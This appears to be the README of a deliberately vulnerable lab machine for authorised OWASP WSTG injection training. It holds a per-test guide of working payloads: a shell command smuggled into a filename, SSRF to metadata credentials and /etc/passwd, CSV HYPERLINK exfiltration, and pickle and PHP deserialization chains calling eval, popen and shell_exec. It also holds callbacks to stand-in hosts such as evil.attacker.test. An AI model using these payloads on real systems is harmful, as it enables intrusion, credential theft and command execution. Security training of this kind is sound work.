# Machine 06 — Injection: Server-side & Protocol

> **WARNING — intentionally vulnerable training target.**
> This machine is deliberately broken for **authorised security testing / training
> only**. Run it on an isolated host, never expose it to untrusted networks, and
> never point its SSRF/redirect/exfil features at anything outside its own
> compose network. All ports are published on `127.0.0.1` only. All mail,
> metadata, credentials and seed data are synthetic and stay in-range.

Covers 13 WSTG IDs / 14 documents (the upstream `WSTG-INJT-13` ID collision —
Buffer Overflow **and** Format String Injection — is covered by a single probe).

## WSTG coverage

| ID | Name | Surface | Severity |
|---|---|---|---|
| WSTG-INJT-10 | IMAP/SMTP Injection | `POST /contact`, `GET /webmail?folder=` | high |
| WSTG-INJT-13 | Buffer Overflow **and** Format String Injection | TCP `:8613` `OVF`/`FMT` | critical |
| WSTG-INJT-14 | Incubated Vulnerability | `POST /incubate/store` → `/incubate/recall` | high |
| WSTG-INJT-15 | HTTP Response Splitting | `GET :8615/legacy?lang=` | high |
| WSTG-INJT-16 | HTTP Request Smuggling | `POST :8616` + innocent GET | critical |
| WSTG-INJT-17 | Host Header Injection | `/password-reset`, `/host-cache/page` | high |
| WSTG-INJT-19 | Server-Side Request Forgery | `GET /fetch?url=` | critical |
| WSTG-INJT-20 | Mass Assignment | `POST /api/users` → `/api/admin/flag` | high |
| WSTG-INJT-21 | CSV Injection | `/feedback` → `/export.csv` → `:8620/csv-open` | medium |
| WSTG-INJT-23 | Insecure Deserialization | `/pickle?data=` (Python), `:8605/?data=` (PHP) | critical |
| WSTG-INJT-24 | Server-side URL Redirect | `GET /redirect?url=` | medium |
| WSTG-INJT-27 | Server-side Document Rendering Injection | `POST :8627/render` | high |
| WSTG-INJT-28 | Regular Expression Denial of Service | `GET /validate?username=` | medium |

## Topology & ports (block 8600-8699)

| Service | Image / build | Published (loopback) | Role |
|---|---|---|---|
| app | python:3.12-slim + Flask | `127.0.0.1:8600` | main portal (most tests) |
| mail | axllent/mailpit:v1.21.0 | `127.0.0.1:8602` (UI/API) | in-range SMTP sink (1025 internal) |
| imap | alpine:3.20 + dovecot | `127.0.0.1:8614` | real IMAP server |
| native | alpine + gcc (static C) | `127.0.0.1:8613` | overflow / format-string target |
| split | python:3.12-slim (raw sockets) | `127.0.0.1:8615` | CRLF response splitting |
| smuggle-front | python:3.12-slim (raw CL-framing proxy) | `127.0.0.1:8616` | CL-framing proxy |
| smuggle-back | python:3.12-slim | *(internal only)* | TE-parsing backend |
| php | php:8.2-apache | `127.0.0.1:8605` | PHP `unserialize()` POP chain |
| renderer | python:3.12-slim + Playwright Chromium | `127.0.0.1:8627` | headless document renderer |
| internal | python:3.12-slim | *(internal only)* | SSRF target, not published |
| metadata | python:3.12-slim | `169.254.169.254` *(in-range)* | cloud-metadata-style IMDS |
| listener | python:3.12-slim | `127.0.0.1:8620` | attacker listener + simulated spreadsheet client |
| worker | python:3.12-slim + curl | *(internal only)* | incubated recall (shell export) |

Networks: `edge` (bridge), `backend` (`internal: true`), `meta`
(`169.254.169.0/24`, metadata alias `169.254.169.254`). The `listener` carries
compose aliases `evil.attacker.test`, `portal.trusted.lab`, `trusted.lab`.

## Run

```bash
cd machines/06-injection-server-protocol
docker compose config -q
docker compose up --build -d        # first build downloads Chromium (~few min)
```

## Verify (isolated venv)

```bash
python3 -m venv verify/.venv
verify/.venv/bin/pip install -r verify/requirements.txt   # stdlib-only, no deps
verify/.venv/bin/python ../../tools/runner.py machines/06-injection-server-protocol
```

Probes are idempotent (they reset their own state) and the ReDoS payload is
bounded (~2 s). Re-running passes again.

## How to attack this (per test)

**INJT-10 — IMAP/SMTP injection.** The portal concatenates input into protocol
commands. SMTP extra recipient:
```bash
curl -s localhost:8600/contact --data-urlencode 'email=alice@lab.test>
RCPT TO:<victim@evil.test' --data-urlencode 'rcpt=support@lab.test' --data-urlencode 'message=hi'
# then inspect http://localhost:8602/api/v1/messages -> victim@evil.test received it
```
IMAP extra command (CRLF in folder):
```
GET /webmail?folder=INBOX"%0d%0aa900 CREATE "pwned
# Dovecot transcript shows `a900 OK CREATE completed`; LIST "" "*" shows `pwned`
```

**INJT-13 — Buffer overflow + format string.** TCP line protocol on `:8613`:
```
OVF AAAAAAAAAAAA...(64)...BBBBBBBB   -> canary=0x4242424242424242 smashed=1
OVF CCCC...(400)...                   -> SIGSEGV (return address overwritten)
FMT %p.%p.%p.%p.%p.%p.%p.%p          -> leaks stack/register pointers
FMT %N$s                              -> reads the in-memory marker string
FMT %N$n                              -> writes memory, changes local `secret`
```
Compiled `-fno-stack-protector -z execstack -no-pie`. Demonstration only — no
weaponisation, no reverse shell.

**INJT-14 — Incubated vulnerability.** Two stages, two components:
```bash
# stage 1: benign store (HTML-escaped, nothing executes)
curl -s localhost:8600/incubate/store -H 'Content-Type: application/json' \
  -d '{"filename":"report.txt; id; curl -s http://listener:8080/hit?stage=incubated; echo ","content":"x"}'
# stage 2: recall -> export worker runs the filename in a shell
curl -s localhost:8600/incubate/recall -H 'Content-Type: application/json' -d '{"id":"<id>"}'
# worker stdout contains uid=...; listener /hits shows the callback
```

**INJT-15 — HTTP response splitting.** Raw service on `:8615`:
```
GET /legacy?lang=en%0d%0aX-Injected:%20pwned          -> extra response header
GET /legacy?lang=en%0d%0a%0d%0aHTTP/1.1%20200%20OK... -> a whole second response
```

**INJT-16 — HTTP request smuggling.** The front proxy (`:8616`) frames by Content-Length only;
the backend honours obfuscated `Transfer-Encoding: xchunked` as chunked. On ONE
persistent connection send a POST whose body is `0\r\n\r\nGET /smuggled ...`, then
an innocent `GET /`. The innocent request receives the `SMUGGLED-RESPONSE`.

**INJT-17 — Host header injection.**
```bash
curl -s 'localhost:8600/password-reset?email=a@b.c' -H 'Host: evil.attacker.test'
curl -s 'localhost:8600/password-reset?email=a@b.c' -H 'X-Forwarded-Host: evil.attacker.test'
# cache poisoning: GET /host-cache/page?probe=X with X-Forwarded-Host: evil,
# then the same URL without the header -> X-Cache: HIT serving the evil host
```

**INJT-19 — SSRF.** `GET /fetch?url=` (no allowlist):
```
http://internal:8080/secret                       (internal-only, unpublished)
http://169.254.169.254/latest/meta-data/iam/security-credentials/acme-portal-role
file:///etc/passwd
gopher://internal:8080/_GET%20/secret%20HTTP/1.1%0d%0aHost:%20internal%0d%0a%0d%0a
```

**INJT-20 — Mass assignment.**
```bash
curl -s localhost:8600/api/users -H 'Content-Type: application/json' \
  -d '{"name":"mallory","email":"m@x","id":"mallory1","is_admin":true,"role":"admin","balance":9999}'
curl -s 'localhost:8600/api/admin/flag?user_id=mallory1'   # 200 + flag (normal user gets 403)
```

**INJT-21 — CSV injection.**
```bash
curl -s localhost:8600/feedback -H 'Content-Type: application/json' \
  -d '{"name":"bob","comment":"=HYPERLINK(\"http://listener:8080/hit?csv=EXFIL\",\"click\")"}'
curl -s localhost:8600/export.csv          # cells written verbatim, =cmd|... and =HYPERLINK survive
curl -s localhost:8620/csv-open --data-binary @export.csv   # simulated client fetches the HYPERLINK
```
*Degraded:* the spreadsheet client is simulated in-range (no headless Excel);
DDE commands are recorded, not executed. The unescaped export and HYPERLINK
exfiltration to the in-range listener are faithful.

**INJT-23 — Insecure deserialization.**
```
Python: GET /pickle?data=<base64 pickle whose __reduce__ = (eval, ("...popen('cat /flag.txt')...",))>
PHP:    GET :8605/?data=<base64 O:6:"Report":1:{s:5:"title";O:6:"Reader":1:{s:4:"path";s:9:"/flag.txt";}}>
        (Report.__wakeup -> Reader.__toString -> file_get_contents) ; Executor.__destruct -> shell_exec('id')
```

**INJT-24 — Server-side URL redirect.** The server validates AND fetches the
target, then 302s. Bypasses:
```
/redirect?url=//evil.attacker.test/
/redirect?url=%2f%2fevil.attacker.test
/redirect?url=\/\/evil.attacker.test/
/redirect?url=https://trusted.lab@evil.attacker.test/
# plain http://evil.attacker.test/ is rejected (400) -> the validator exists but is bypassable
```

**INJT-27 — Document rendering injection.** `POST :8627/render {"html": ...}`.
Injected JS (web security disabled, file access allowed) reads
`file:///etc/passwd`, SSRFs `http://internal:8080/secret` and executes in the
rendering context; a PDF is produced.

**INJT-28 — ReDoS.** `GET /validate?username=` uses `^(a+)+$`:
```
username=aaa                 -> ~0.0001 s
username=aaaaaaaaaaaaaaaaaaaaaaaaaaa!  (27 a's + !) -> ~2 s (superlinear)
```